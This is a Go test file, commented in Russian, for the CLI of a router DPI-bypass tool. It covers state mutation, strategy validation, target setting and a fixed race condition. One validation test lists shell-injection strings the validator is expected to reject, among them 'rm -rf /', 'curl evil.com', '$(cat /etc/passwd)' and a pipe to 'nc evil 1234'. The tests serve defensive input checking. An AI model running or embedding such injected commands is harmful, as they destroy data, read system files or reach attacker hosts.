package cli

import (
	"context"
	"fmt"
	"path/filepath"
	"strings"
	"sync"
	"testing"

	"github.com/kittylabassistant/sign-craze/internal/state"
)

// --- withStateMutation: поведенческие тесты хелпера (R14) ---
//
// withStateMutation в проде идёт через реальные withLock/loadState/saveState,
// жёстко привязанные к /opt/var/lock/sign-craze.lock и
// /opt/etc/sign-craze/state.json — недоступным для записи вне роутера/root.
// Поэтому тесты подменяют сеймы withStateMutationLock/Load/Save фейками;
// t.Cleanup восстанавливает оригиналы. t.Parallel() здесь не используется
// (см. cmd_ports_test.go) — безопасно мутировать пакетные var.

func TestWithStateMutation_ХэппиПас(t *testing.T) {
	origLock, origLoad, origSave := withStateMutationLock, withStateMutationLoad, withStateMutationSave
	t.Cleanup(func() {
		withStateMutationLock, withStateMutationLoad, withStateMutationSave = origLock, origLoad, origSave
	})

	withStateMutationLock = func(_ context.Context, fn func() error) error { return fn() }
	loaded := &state.State{}
	withStateMutationLoad = func() (*state.State, error) { return loaded, nil }
	var saved *state.State
	withStateMutationSave = func(s *state.State) error {
		saved = s
		return nil
	}

	err := withStateMutation(context.Background(), func(s *state.State) error {
		s.DPIEnabled = true
		return nil
	})
	if err != nil {
		t.Fatalf("withStateMutation: %v", err)
	}
	if saved == nil || !saved.DPIEnabled {
		t.Fatalf("saveState должен был получить мутированный state, получено: %+v", saved)
	}
}

func TestWithStateMutation_ОшибкаМутации_НеСохраняет(t *testing.T) {
	origLock, origLoad, origSave := withStateMutationLock, withStateMutationLoad, withStateMutationSave
	t.Cleanup(func() {
		withStateMutationLock, withStateMutationLoad, withStateMutationSave = origLock, origLoad, origSave
	})

	withStateMutationLock = func(_ context.Context, fn func() error) error { return fn() }
	withStateMutationLoad = func() (*state.State, error) { return &state.State{}, nil }
	saveCalled := false
	withStateMutationSave = func(*state.State) error {
		saveCalled = true
		return nil
	}

	err := withStateMutation(context.Background(), func(*state.State) error {
		return fmt.Errorf("инжектированная ошибка мутации")
	})
	if err == nil {
		t.Fatal("ожидалась инжектированная ошибка мутации")
	}
	if !strings.Contains(err.Error(), "инжектированная ошибка мутации") {
		t.Fatalf("ошибка должна прийти из mutate, получено: %v", err)
	}
	if saveCalled {
		t.Error("saveState не должен был вызываться при ошибке mutate")
	}
}

func TestValidateDPIStrategy_Допустимые(t *testing.T) {
	ok := []string{
		"--dpi-desync=fake,split2",
		"--filter-tcp=443,80,1984,5222 --lua-desync=fake:blob=tls_clienthello",
		"--lua-desync=hostfakesplit:host=ozon.ru:strategy=3",
		"@preset/youtube",
		"file:///opt/etc/sign-craze/strategy.txt",
		"sni=fonts.google.com",
	}
	for _, s := range ok {
		t.Run(s, func(t *testing.T) {
			if err := validateDPIStrategy(s); err != nil {
				t.Fatalf("ожидалась успешная валидация, получено: %v", err)
			}
		})
	}
}

func TestValidateDPIStrategy_ЗапрещённыеСимволы(t *testing.T) {
	bad := map[string]string{
		"shell-injection-semicolon": "--dpi-desync=fake; rm -rf /",
		"shell-injection-amp":       "--dpi-desync=fake & curl evil.com",
		"command-substitution":      "--dpi-desync=$(cat /etc/passwd)",
		"backtick-command":          "--dpi-desync=`whoami`",
		"redirection":               "--dpi-desync=fake > /dev/null",
		"pipe":                      "--dpi-desync=fake | nc evil 1234",
		"newline":                   "--dpi-desync=fake\nnew-flag",
		"null-byte":                 "--dpi-desync=fake\x00",
		"open-paren":                "--dpi-desync=fake(1)",
	}
	for name, s := range bad {
		t.Run(name, func(t *testing.T) {
			err := validateDPIStrategy(s)
			if err == nil {
				t.Fatalf("ожидалась ошибка для %q", s)
			}
			if !strings.Contains(err.Error(), "запрещённый символ") {
				t.Fatalf("сообщение должно упомянуть 'запрещённый символ', получено: %v", err)
			}
		})
	}
}

func TestValidateDPIStrategy_Пустая(t *testing.T) {
	if err := validateDPIStrategy(""); err == nil {
		t.Fatal("ожидалась ошибка для пустой строки")
	}
}

func TestValidateDPIStrategy_СлишкомДлинная(t *testing.T) {
	long := strings.Repeat("a", dpiStrategyMaxLen+1)
	if err := validateDPIStrategy(long); err == nil {
		t.Fatal("ожидалась ошибка для строки длиннее лимита")
	}
}

// --- setDPITargets: поведенческие тесты извлечённой логики ---
//
// Тесты с DPIEnabled=false (нулевое значение Default()) не заходят в ветку
// регенерации nfqws2-конфига. Ветка регенерации тестируется через подмену
// seam'а regenDPIConfigFn — реальная реализация шлётся в `ip route show
// default` и пишет в захардкоженные пути internal/dpi
// (/opt/etc/sign-craze/...), поведение которых зависит от окружения
// (на GitHub-раннере /opt записываем, в песочнице — нет).

// withFakeRegenDPIConfig подменяет regenDPIConfigFn на время теста.
func withFakeRegenDPIConfig(t *testing.T, fn func(context.Context, *state.State) error) {
	t.Helper()
	orig := regenDPIConfigFn
	regenDPIConfigFn = fn
	t.Cleanup(func() { regenDPIConfigFn = orig })
}

func TestSetDPITargets_БазовыйSetGet(t *testing.T) {
	path := filepath.Join(t.TempDir(), "state.json")
	ctx := context.Background()

	if err := setDPITargets(ctx, path, []string{"a.example.com", "b.example.com"}); err != nil {
		t.Fatalf("setDPITargets: %v", err)
	}

	mgr := state.NewDPITargetsManager(path)
	got, err := mgr.ListTargets(ctx)
	if err != nil {
		t.Fatalf("ListTargets: %v", err)
	}
	want := []string{"a.example.com", "b.example.com"}
	if len(got) != len(want) {
		t.Fatalf("got %v, want %v", got, want)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Errorf("got %v, want %v", got, want)
		}
	}
}

func TestSetDPITargets_Clear(t *testing.T) {
	path := filepath.Join(t.TempDir(), "state.json")
	ctx := context.Background()

	if err := setDPITargets(ctx, path, []string{"a.example.com"}); err != nil {
		t.Fatalf("setDPITargets (initial): %v", err)
	}
	// handleDPITargets передаёт nil при вводе "clear"/"none"/"-"/"".
	if err := setDPITargets(ctx, path, nil); err != nil {
		t.Fatalf("setDPITargets (clear): %v", err)
	}

	mgr := state.NewDPITargetsManager(path)
	got, err := mgr.ListTargets(ctx)
	if err != nil {
		t.Fatalf("ListTargets: %v", err)
	}
	if len(got) != 0 {
		t.Errorf("после clear targets = %v, ожидался пустой список", got)
	}
}

// TestSetDPITargets_DPIВключён_TargetsСохраненыДажеЕслиРегенерацияУпала
// проверяет порядок действий, явно затребованный при рефакторе: SetTargets
// сохраняет новые targets ПЕРВЫМ (атомарно, под общим с Web UI локом), и это
// сохранение остаётся в силе даже если последующая регенерация nfqws2-конфига
// не удалась. Падение регенерации инжектируется через seam regenDPIConfigFn —
// детерминированно в любом окружении.
func TestSetDPITargets_DPIВключён_TargetsСохраненыДажеЕслиРегенерацияУпала(t *testing.T) {
	path := filepath.Join(t.TempDir(), "state.json")
	ctx := context.Background()

	if err := state.Save(path, &state.State{DPIEnabled: true}); err != nil {
		t.Fatalf("исходное сохранение (DPIEnabled=true): %v", err)
	}
	withFakeRegenDPIConfig(t, func(context.Context, *state.State) error {
		return fmt.Errorf("инжектированная ошибка регенерации")
	})

	err := setDPITargets(ctx, path, []string{"example.com"})
	if err == nil {
		t.Fatal("ожидалась инжектированная ошибка регенерации конфига")
	}
	if !strings.Contains(err.Error(), "инжектированная ошибка регенерации") {
		t.Fatalf("ошибка должна прийти из регенерации, получено: %v", err)
	}

	// Ключевая проверка: несмотря на ошибку регенерации, targets уже сохранены —
	// SetTargets выполнился и закоммитил их до того, как упала регенерация.
	fresh, loadErr := state.Load(path)
	if loadErr != nil {
		t.Fatalf("state.Load: %v", loadErr)
	}
	if len(fresh.DPITargets) != 1 || fresh.DPITargets[0] != "example.com" {
		t.Errorf("DPITargets = %v, ожидалось [example.com] (SetTargets должен был сохранить их до регенерации)", fresh.DPITargets)
	}
}

// TestSetDPITargets_DPIВключён_РегенерацияВызванаСоСвежимState — позитивный
// кейс ветки регенерации: seam вызывается ровно один раз и получает
// СВЕЖЕПРОЧИТАННЫЙ state (с уже сохранёнными targets), а не устаревший снимок.
func TestSetDPITargets_DPIВключён_РегенерацияВызванаСоСвежимState(t *testing.T) {
	path := filepath.Join(t.TempDir(), "state.json")
	ctx := context.Background()

	if err := state.Save(path, &state.State{DPIEnabled: true}); err != nil {
		t.Fatalf("исходное сохранение (DPIEnabled=true): %v", err)
	}
	calls := 0
	withFakeRegenDPIConfig(t, func(_ context.Context, st *state.State) error {
		calls++
		if len(st.DPITargets) != 1 || st.DPITargets[0] != "example.com" {
			t.Errorf("регенерация получила state с DPITargets=%v, ожидалось [example.com]", st.DPITargets)
		}
		return nil
	})

	if err := setDPITargets(ctx, path, []string{"example.com"}); err != nil {
		t.Fatalf("setDPITargets: %v", err)
	}
	if calls != 1 {
		t.Errorf("регенерация вызвана %d раз, ожидался ровно 1", calls)
	}
}

// TestRawSetDPITargets_ГонкаСPortsManager_ТеряетПравку детерминированно
// воспроизводит МЕХАНИЗМ бага B4 для handleDPITargets — он даже опаснее, чем
// для портов: раньше handleDPITargets читал ВЕСЬ *state.State, менял только
// поле DPITargets и сохранял ВЕСЬ снимок обратно через saveState() под ДРУГИМ
// локом (locks.DefaultPath), нежели тот, что использует state.NewPortsManager
// Web UI (statePath+".lock"). Устаревший снимок при сохранении затирает
// ЛЮБОЕ конкурентное изменение других полей, не только DPITargets.
//
// Тест не вызывает код cmd_dpi.go (после фикса setDPITargets сам использует
// DPITargetsManager и такой гонке не подвержен) — он документирует причину
// бага прямыми вызовами internal/state, воспроизводя её детерминированно.
func TestRawSetDPITargets_ГонкаСPortsManager_ТеряетПравку(t *testing.T) {
	path := filepath.Join(t.TempDir(), "state.json")
	ctx := context.Background()

	if err := state.Save(path, &state.State{Ports: []uint16{80}}); err != nil {
		t.Fatalf("исходное сохранение: %v", err)
	}

	// 1. "Старый handleDPITargets" читает ВЕСЬ state.json сырым Load — снимок
	//    ДО изменения, которое чуть позже сделает Web UI.
	stale, err := state.Load(path)
	if err != nil {
		t.Fatalf("raw Load: %v", err)
	}

	// 2. Конкурентно Web UI добавляет порт 443 через PortsManager — атомарно,
	//    под своим локом.
	mgr := state.NewPortsManager(path)
	if addErr := mgr.AddPort(ctx, 443); addErr != nil {
		t.Fatalf("AddPort через менеджер: %v", addErr)
	}

	// 3. "Старый handleDPITargets" меняет DPITargets в СВОЁМ устаревшем снимке
	//    и сохраняет его целиком сырым Save — перезаписывая state.json.
	stale.DPITargets = []string{"example.com"}
	if saveErr := state.Save(path, stale); saveErr != nil {
		t.Fatalf("raw Save: %v", saveErr)
	}

	final, err := state.Load(path)
	if err != nil {
		t.Fatalf("финальный Load: %v", err)
	}
	has443 := false
	for _, p := range final.Ports {
		if p == 443 {
			has443 = true
		}
	}
	if has443 {
		t.Fatalf("порт 443 не должен был выжить при воспроизведении бага B4: %v", final.Ports)
	}
	t.Logf("гонка B4 воспроизведена: raw Save затёр порт Web UI при установке DPITargets, итог Ports=%v (443 потерян)", final.Ports)
}

// TestSetDPITargets_ConcurrentWithPortsManager_НеТеряетПорты — доказательство
// фикса: реальный код cmd_dpi.go (setDPITargets) и код Web UI
// (state.NewPortsManager напрямую) одновременно пишут в один state.json.
// Оба пути теперь используют менеджеры state-пакета (разные менеджеры, но
// один и тот же lock-файл statePath+".lock", см. withStateLock в
// internal/state/managers.go) — порты Web UI не теряются, в отличие от
// TestRawSetDPITargets_ГонкаСPortsManager_ТеряетПравку выше.
func TestSetDPITargets_ConcurrentWithPortsManager_НеТеряетПорты(t *testing.T) {
	path := filepath.Join(t.TempDir(), "state.json")
	ctx := context.Background()

	const nCLI = 10 // через setDPITargets — эмулирует конкурентные sign-craze --dpi-targets
	const nWeb = 15 // через PortsManager напрямую — эмулирует Web UI

	var wg sync.WaitGroup
	errCh := make(chan error, nCLI+nWeb)

	for i := 0; i < nCLI; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			// Все горутины пишут ОДНО и то же значение — SetTargets это replace,
			// а не merge, поэтому важен не "победитель", а то, что после гонки
			// результат остаётся ЭТИМ валидным значением, а не искалеченным
			// смешением/потерянными полями.
			errCh <- setDPITargets(ctx, path, []string{"example.com"})
		}()
	}

	mgr := state.NewPortsManager(path)
	for i := 0; i < nWeb; i++ {
		port := 40000 + i
		wg.Add(1)
		go func() {
			defer wg.Done()
			errCh <- mgr.AddPort(ctx, port)
		}()
	}

	wg.Wait()
	close(errCh)
	for err := range errCh {
		if err != nil {
			t.Errorf("параллельная запись: %v", err)
		}
	}

	final, err := state.Load(path)
	if err != nil {
		t.Fatalf("state.Load: %v", err)
	}
	if len(final.DPITargets) != 1 || final.DPITargets[0] != "example.com" {
		t.Errorf("DPITargets = %v, ожидалось [example.com]", final.DPITargets)
	}
	got := make(map[int]bool, len(final.Ports))
	for _, p := range final.Ports {
		got[int(p)] = true
	}
	for i := 0; i < nWeb; i++ {
		if !got[40000+i] {
			t.Errorf("порт %d (через PortsManager/Web UI) потерян при конкурентном --dpi-targets — B4 не исправлен", 40000+i)
		}
	}
	if len(final.Ports) != nWeb {
		t.Errorf("len(Ports) = %d, ожидалось %d: %v", len(final.Ports), nWeb, final.Ports)
	}
}
